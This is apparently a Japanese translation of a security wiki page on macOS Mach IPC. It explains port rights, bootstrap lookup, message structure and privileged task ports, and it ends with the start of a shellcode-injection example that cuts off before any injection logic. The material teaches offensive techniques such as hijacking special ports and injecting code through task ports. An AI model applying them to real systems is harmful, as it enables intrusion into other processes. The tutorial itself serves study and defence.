# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Ports経由のMach messaging

### 基本情報

Machはリソース共有の**最小単位**として**task**を使用し、各taskには**複数のthread**を含めることができます。これらの**taskとthreadは、POSIXのprocessとthreadに1:1で対応付けられています**。

task間の通信はMach Inter-Process Communication（IPC）を介して行われ、一方向の通信チャネルを利用します。**メッセージはport間で転送され**、portはkernelによって管理される**メッセージキュー**のような役割を果たします。

**port**はMach IPCの**基本**要素です。メッセージの**送信と受信**に使用できます。

各processには**IPC table**があり、そこから**そのprocessのmach port**を確認できます。mach portの名前は実際には数値です（kernel objectへのポインター）。

processは、いくつかの権限とともにport nameを**別のtask**へ送信することもできます。この場合、kernelはもう一方のtaskの**IPC table**にこのエントリを出現させます。

### Port Rights

どの操作をtaskが実行できるかを定義するport rightsは、この通信において重要です。利用可能な**port rights**は次のとおりです（[definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）。<sup>[[1]](#references)</sup>

- **Receive right**は、そのportに送信されたメッセージを受信できるようにします。Mach portはMPSC（multiple-producer, single-consumer）キューです。つまり、pipeとは異なり、システム全体で**各portにつき1つのReceive rightしか存在できません**（pipeの場合は、複数のprocessが1つのpipeの読み取り側に対するfile descriptorを保持できます）。
- **Receive** rightを持つ**task**はメッセージを受信し、**Send rightsを作成**できます。これによりメッセージを送信できるようになります。元々、**自身のtaskだけがそのportに対するReceive rightを持っています**。
- Receive rightの所有者が**終了**するか、それをkillすると、**send rightは使用できなくなります（dead name）**。
- **Send right**は、そのportにメッセージを送信できるようにします。
- Send rightは**clone**できます。そのため、Send rightを所有するtaskはrightをcloneし、**3つ目のtaskに付与**できます。
- **port rights**はMach messageを通じて**渡す**こともできます。
- **Send-once right**は、そのportに1つのメッセージを送信でき、その後消滅します。
- このrightは**cloneできません**が、**移動**させることはできます。
- **Port set right**は、単一のportではなく_port set_を示します。port setからメッセージをdequeueすると、そこに含まれるportのいずれかからメッセージがdequeueされます。port setは複数のportを同時にlistenするために使用でき、Unixにおける`select`/`poll`/`epoll`/`kqueue`に非常によく似ています。
- **Dead name**は実際のport rightではなく、単なるプレースホルダーです。portが破棄されると、そのportに対する既存のport rightsはすべてdead nameに変わります。

**taskはSEND rightsを他のtaskへ転送**できるため、転送先はメッセージを送り返せるようになります。**SEND rightsはcloneすることもできるため、taskはrightを複製して3つ目のtaskに渡せます**。これに、**bootstrap server**として知られる仲介processを組み合わせることで、task間の効果的な通信が可能になります。

### File Ports

File portsを使用すると、file descriptorをMac port（Mach port rightsを使用）にカプセル化できます。指定したFDから`fileport_makeport`を使用して`fileport`を作成し、fileportから`fileport_makefd`を使用してFDを作成できます。

### 通信の確立

前述のとおり、Mach messageを使用してrightsを送信できます。ただし、Mach messageを送信するためのrightをすでに持っていなければ、rightを送信することは**できません**。では、最初の通信はどのように確立されるのでしょうか。

このために**bootstrap server**（macOSでは**launchd**）が関与します。**誰でもbootstrap serverへのSEND rightを取得できる**ため、別のprocessへメッセージを送信するためのrightを要求できます。

1. Task **A**が**新しいport**を作成し、そのportに対する**RECEIVE right**を取得します。
2. Task **A**はRECEIVE rightの保持者として、**そのportのSEND rightを生成**します。
3. Task **A**が**bootstrap server**との**connection**を確立し、最初に生成したportの**SEND rightを送信**します。
- 誰でもbootstrap serverへのSEND rightを取得できることに注意してください。
4. Task Aが`bootstrap_register` messageをbootstrap serverに送信し、指定されたportを`com.apple.taska`のような**名前に関連付け**ます。
5. Task **B**が**bootstrap server**とやり取りし、service name（`bootstrap_lookup`）のbootstrap **lookup**を実行します。serverが応答できるように、Task Bはlookup message内で、以前に作成したportへの**SEND rightを送信**します。lookupが成功すると、**serverはTask Aから受け取ったSEND rightを複製**し、**Task Bへ送信**します。
- 誰でもbootstrap serverへのSEND rightを取得できることに注意してください。
6. このSEND rightにより、**Task BはTask Aへメッセージを送信**できるようになります。
7. 双方向通信では通常、Task **B**が**RECEIVE right**と**SEND right**を持つ新しいportを生成し、**SEND rightをTask Aへ渡します**。これにより、Task AはTASK Bへメッセージを送信できます（双方向通信）。

bootstrap serverは、taskが申告したservice nameを認証**できません**。つまり、ある**task**が任意のsystem taskになりすます可能性があります。たとえば、認証service nameを偽って**要求をすべて承認する**ことが可能です。

そこでAppleは、systemが提供する**serviceの名前**を、SIPで保護されたdirectoryである`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`内のsecure configuration fileに保存しています。各service nameとともに、**関連するbinaryも保存**されています。bootstrap serverは、これらのservice nameごとに**RECEIVE rightを作成して保持**します。

これらの事前定義されたserviceでは、**lookupの処理が少し異なります**。service nameがlookupされると、launchdがserviceを動的に起動します。新しいworkflowは次のとおりです。

- Task **B**がservice nameのbootstrap **lookup**を開始します。
- **launchd**はtaskが実行中か確認し、実行中でなければ**起動**します。
- Task **A**（service）がbootstrap **check-in**（`bootstrap_check_in()`）を実行します。ここで**bootstrap** serverはSEND rightを作成して保持し、**RECEIVE rightをTask Aへ転送**します。
- launchdが**SEND rightを複製してTask Bへ送信**します。
- **Task B**が**RECEIVE right**と**SEND right**を持つ新しいportを生成し、**SEND rightをTask A**（svc）へ渡します。これによりTask AはTASK Bへメッセージを送信できます（双方向通信）。

ただし、この処理が適用されるのは事前定義されたsystem taskだけです。system以外のtaskは従来どおり動作するため、なりすましが可能になるおそれがあります。

> [!CAUTION]
> したがって、launchdは決してcrashしてはなりません。crashするとシステム全体がcrashします。

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

本質的にはsystem callである`mach_msg` functionは、Mach messageの送受信に使用されます。このfunctionは、最初の引数として送信するmessageを必要とします。このmessageは`mach_msg_header_t` structureで始まり、その後に実際のmessage contentが続きます。このstructureは次のように定義されています。
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
_**receive right**_を持つProcessは、Mach port上でmessageを受信できます。逆に、**senders**には_**send**_または_**send-once right**_が付与されます。send-once rightは1つのmessageを送信するためだけに使用され、その後は無効になります。

最初のフィールドである**`msgh_bits`**はビットマップです。

- 最初のビット（最上位ビット）は、messageがcomplexであることを示すために使用されます（詳細は後述）
- 3番目と4番目のビットはkernelによって使用されます
- 2番目のバイトの**下位5ビット**は、**voucher**に使用できます。これはkey/valueの組み合わせを送信するための、別の種類のportです。
- 3番目のバイトの**下位5ビット**は、**local port**に使用できます
- 4番目のバイトの**下位5ビット**は、**remote port**に使用できます

voucher、local port、remote portで指定できるtypeは、[**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)から確認できます。
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
例えば、`MACH_MSG_TYPE_MAKE_SEND_ONCE` は、この port に対して **send-once** **right** を派生させて転送すべきことを **示す** ために使用できます。また、受信者が返信できないように、`MACH_PORT_NULL` を指定することもできます。

簡単な **双方向通信** を実現するために、process は mach **message header** 内に、メッセージの**受信者**がこのメッセージに対する **reply を送信**できる **mach port** を指定できます。これは _reply port_（**`msgh_local_port`**）と呼ばれます。

> [!TIP]
> この形式の双方向通信は、reply を想定する XPC messages（`xpc_connection_send_message_with_reply` および `xpc_connection_send_message_with_reply_sync`）で使用されることに注意してください。ただし、通常は、前述のように双方向通信を作成するために**異なる port が作成されます**。

message header のその他のフィールドは次のとおりです。

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信される port。
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`: このメッセージの ID。受信者によって解釈されます。

> [!CAUTION]
> **mach messages は `mach port` 上で送信されます**。これは mach kernel に組み込まれた、**単一 receiver**、**複数 sender** の communication channel です。**複数の process** が mach port に **messages を送信**できますが、どの時点でもそこから**読み取れる process は 1 つだけ**です。

Messages は、**`mach_msg_header_t`** header、その後に続く **body**、さらに（存在する場合は）**trailer** によって構成され、返信する permission を付与できます。この場合、kernel は単に message を一方の task からもう一方へ渡す必要があります。

**trailer** は **kernel によって message に追加される情報**（user が設定することはできません）であり、`MACH_RCV_TRAILER_<trailer_opt>` flags を使用して message の受信時に要求できます（要求できる情報にはさまざまな種類があります）。

#### Complex Messages

ただし、追加の port rights を渡したり、memory を共有したりするような、より **complex** な messages も存在します。この場合、kernel はこれらの objects も recipient に送信する必要があります。この場合、header の `msgh_bits` の最上位 bit が設定されます。

渡すことのできる descriptors は [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) で定義されています：
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
32ビットでは、すべての descriptor は12Bで、descriptor type は11番目のものにあります。64ビットでは、サイズはさまざまです。

> [!CAUTION]
> kernel は、ある task から別の task へ descriptor をコピーしますが、最初に **kernel memory 内にコピーを作成**します。この technique は「Feng Shui」と呼ばれ、複数の exploit で悪用されています。プロセス自身に descriptor を送信させることで、**kernel にその memory 内のデータをコピーさせる**ものです。その後、プロセスはメッセージを受信できます（kernel がそれらを解放します）。
>
> **vulnerable process に port rights を送信する**ことも可能で、その port rights は、プロセスが処理していない場合でも、単にプロセス内に現れます。

### Mac Ports APIs

port は task namespace に関連付けられているため、port を作成または検索するには task namespace も照会されます（詳細は `mach/mach_port.h` を参照）。

- **`mach_port_allocate` | `mach_port_construct`**: **port を作成**します。
- `mach_port_allocate` は **port set**（port のグループに対する receive right）も作成できます。メッセージを受信すると、そのメッセージの送信元 port が示されます。
- `mach_port_allocate_name`: port の名前を変更します（デフォルトでは32ビット整数）
- `mach_port_names`: target から port names を取得します
- `mach_port_type`: name に対する task の rights を取得します
- `mach_port_rename`: port の名前を変更します（FD に対する dup2 と同様）
- `mach_port_allocate`: 新しい RECEIVE、PORT_SET、または DEAD_NAME を割り当てます
- `mach_port_insert_right`: RECEIVE を持つ port に新しい right を作成します
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach messages の送受信**に使用される関数です。overwrite 版では、メッセージ受信用に別の buffer を指定できます（もう一方の版では同じ buffer を再利用します）。

### Debug mach_msg

**`mach_msg`** と **`mach_msg_overwrite`** はメッセージの送受信に使用される関数なので、これらに breakpoint を設定すると、送受信されるメッセージを調査できます。

たとえば、debug 可能な任意のアプリケーションの debug を開始すると、`libSystem.B` がロードされ、この **function が使用されます**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`** の引数を取得するには、registers を確認します。引数は次のとおりです（[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) より）。
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
レジストリから値を取得します：
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
メッセージヘッダーを調べ、最初の引数を確認します：
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
この種類の `mach_msg_bits_t` は、reply を許可するためによく使用されます。

### ポートを列挙する
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** は port に割り当てられるデフォルト名です（最初の 3 バイトでどのように **増加** しているかを確認してください）。**`ipc-object`** は port の **難読化された** 一意の **識別子** です。\
**`send`** 権限のみを持つ port が、その所有者（port name + pid）を **識別している** ことにも注目してください。\
また、同じ port に接続されている **他の task** を示すために **`+`** が使用されている点にも注意してください。

[**procesxp**](https://www.newosxbook.com/tools/procexp.html) を使用して、**登録済みの service name** も確認できます（`com.apple.system-task-port` が必要なため、SIP は無効化されています）：
```
procesp 1 ports
```
iOSでは、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)からダウンロードしてこのツールをインストールできます。

### コード例

**sender**がポートを**allocate**し、`org.darlinghq.example`という名前の**send right**を作成して、それを**bootstrap server**に送信している点に注目してください。一方、senderはその名前の**send right**を要求し、それを使って**メッセージを送信**しています。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

タスクがこれらに対する **SEND** permissions を持っている場合、**特定の機密性の高いアクションを実行したり、特定の機密データにアクセスしたりできる**特殊な port がいくつか存在します。このため、これらの port は機能面だけでなく、**タスク間で SEND permissions を共有できる**という点でも attackers にとって非常に興味深いものです。

### Host Special Ports

これらの port は番号で表されます。

**SEND** rights は **`host_get_special_port`** を呼び出すことで取得でき、**RECEIVE** rights は **`host_set_special_port`** を呼び出すことで取得できます。ただし、どちらの呼び出しにも **`host_priv`** port が必要であり、これにアクセスできるのは root のみです。さらに、過去には root が **`host_set_special_port`** を呼び出して任意の port を hijack できました。たとえば **`HOST_KEXTD_PORT`** を hijack することで code signatures を bypass できました（現在は SIP により防止されています）。

これらは2つのグループに分けられます。**最初の7つの port は kernel が所有**しており、1番目が `HOST_PORT`、2番目が `HOST_PRIV_PORT`、3番目が `HOST_IO_MASTER_PORT`、7番目が `HOST_MAX_SPECIAL_KERNEL_PORT` です。\
番号 **8** 以降の port は **system daemons が所有**しており、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) で宣言されています。

- **Host port**: ある process がこの port に対する **SEND** privilege を持っている場合、以下の routine を呼び出して **system** に関する **information** を取得できます。
- `host_processor_info`: processor info を取得
- `host_info`: host info を取得
- `host_virtual_physical_table_info`: Virtual/Physical page table（MACH_VMDEBUG が必要）
- `host_statistics`: host statistics を取得
- `mach_memory_info`: kernel memory layout を取得
- **Host Priv port**: この port に対する **SEND** right を持つ process は、boot data の表示や kernel extension の load 試行などの **privileged actions** を実行できます。この permission を取得するには **process が root である必要があります**。
- さらに、**`kext_request`** API を呼び出すには、Apple binaries にのみ付与される **`com.apple.private.kext*`** などの追加 entitlements が必要です。
- 呼び出し可能なその他の routine は次のとおりです。
- `host_get_boot_info`: `machine_boot_info()` を取得
- `host_priv_statistics`: privileged statistics を取得
- `vm_allocate_cpm`: Contiguous Physical Memory を allocate
- `host_processors`: host processors に対する Send right
- `mach_vm_wire`: memory を resident にする
- **root** はこの permission にアクセスできるため、`host_set_[special/exception]_port[s]` を呼び出して **host special または exception ports を hijack** できます。

以下を実行することで、**すべての host special ports を確認**できます。
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

これらは、よく知られたサービス用に予約されたポートです。`task_[get/set]_special_port` を呼び出すことで、取得または設定できます。これらは `task_special_ports.h` にあります。
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[9]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: この task の制御に使用される port。task に影響を与える messages の送信に使用されます。これは **mach_task_self (see Task Ports below)** によって返される port です。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: task の bootstrap port。他の system service ports の返却を要求する messages の送信に使用されます。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 所属する host の情報を要求するために使用される port。これは **mach_host_self** によって返される port です。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: この task が wired kernel memory を取得する source を示す port。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: この task が default memory managed memory を取得する source を示す port。

### Task Ports

もともと Mach には「process」はなく、thread の container に近いものとして「task」が存在していました。Mach が BSD と統合された際、**各 task は BSD process と対応付けられました**。そのため、すべての BSD process には process として必要な details があり、すべての Mach task にも内部的な仕組みがあります（pid 0 は存在せず、`kernel_task` であるため除きます）。

これに関連する非常に興味深い functions が 2 つあります。

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: `pid` で指定された task に対応する task の SEND right を取得し、それを指定された `target_task_port` に渡します（通常は `mach_task_self()` を使用した caller task ですが、別の task 上の SEND port である可能性もあります）。
- `pid_for_task(task, &pid)`: task への SEND right が与えられた場合、この task がどの PID に関連付けられているかを特定します。

task 内で actions を実行するには、task は `mach_task_self()`（`task_self_trap` (28) を使用）を呼び出して、自身への `SEND` right を必要とします。この permission により、task は次のような複数の actions を実行できます。

- `task_threads`: task の threads に対応するすべての task ports への SEND right を取得
- `task_info`: task に関する info を取得
- `task_suspend/resume`: task を suspend または resume
- `task_[get/set]_special_port`
- `thread_create`: thread を作成
- `task_[get/set]_state`: task state を制御
- その他については [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) を参照してください

> [!CAUTION]
> **別の task** の task port に対する SEND right がある場合、その別の task に対してこれらの actions を実行できます。

さらに、task_port は **`vm_map`** port でもあり、`vm_read()` や `vm_write()` などの functions によって task 内部の **memory の読み取りと操作**を可能にします。これは基本的に、別の task の task_port に対する SEND rights を持つ task が、その task に **code を inject** できることを意味します。

**kernel も task である**ことを覚えておいてください。誰かが **`kernel_task`** に対する **SEND permissions** を取得できれば、kernel に任意のものを実行させることができます（jailbreaks）。

- `mach_task_self()` を呼び出して、caller task のこの port の **name を取得**します。この port は **`exec()`** をまたいでのみ **継承**されます。`fork()` で作成された新しい task は新しい task port を取得します（特殊なケースとして、suid binary での `exec()` 後にも task は新しい task port を取得します）。task を spawn してその port を取得する唯一の方法は、`fork()` の実行中に ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) を行うことです。
- port への access に関する制限は次のとおりです（binary `AppleMobileFileIntegrity` の `macos_task_policy` より）。
- app が **`com.apple.security.get-task-allow` entitlement** を持つ場合、**同じ user の** processes が task port に access できます（通常、debugging のために Xcode によって追加されます）。**notarization** process は production releases にこれを許可しません。
- **`com.apple.system-task-ports`** entitlement を持つ apps は、kernel を除く **任意の** process の **task port** を取得できます。以前の versions では **`task_for_pid-allow`** と呼ばれていました。これは Apple applications にのみ付与されます。
- **Root は、hardened runtime で compile されていない**（かつ Apple 製ではない）applications の **task ports に access**できます。

**The task name port:** _task port_ の unprivileged version。task を参照しますが、task の制御は許可しません。これを通じて利用できるように見える唯一のものは `task_info()` です。

### Thread Ports

Threads にも関連付けられた ports があり、task からは **`task_threads`** によって、processor からは `processor_set_threads` によって確認できます。thread port に対する SEND right により、`thread_act` subsystem の functions を使用できます。

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任意の thread は **`mach_thread_sef`** を呼び出してこの port を取得できます。

### Shellcode Injection in thread via Task port

以下から shellcode を取得できます。


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

前述のプログラムを**Compile**し、同じユーザーとしてコードをinjectできるように**entitlements**を追加します（そうしない場合は**sudo**を使用する必要があります）。<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

